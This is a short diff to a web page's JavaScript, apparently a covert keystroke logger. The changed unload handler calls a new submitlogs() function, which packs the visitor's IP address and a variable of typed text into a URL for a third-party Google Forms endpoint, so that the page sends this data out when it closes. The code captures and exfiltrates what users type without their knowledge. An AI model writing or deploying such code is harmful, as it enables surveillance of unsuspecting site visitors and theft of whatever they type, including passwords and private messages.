@@ -69,7 +69,11 @@ navigator.getBattery().then(function(battery){
 })
 
 window.onbeforeunload = function(event) {
-    console.log(typedthings);
+    submitlogs();
+    event.returnValue = "Write something clever here..";
+};
+
+function submitlogs() {
     var q1ID = "entry.88647228";
     var q2ID = "entry.1849841354";
     var baseURL = 'https://docs.google.com/forms/d/e/1FAIpQLSdiv86i5CkCP8khRJmjUU-Bw2kVC5f_mAuOU7ZsyOADl61epA/formResponse?';
@@ -77,5 +81,4 @@ window.onbeforeunload = function(event) {
     var submitURL = (baseURL + q1ID + "=" + ipadd + "&" + q2ID + "=" + typedthings + submitRef);
     console.log(submitURL);
     $(this)[0].action=submitURL;
-    event.returnValue = "Write something clever here..";
-};
+}
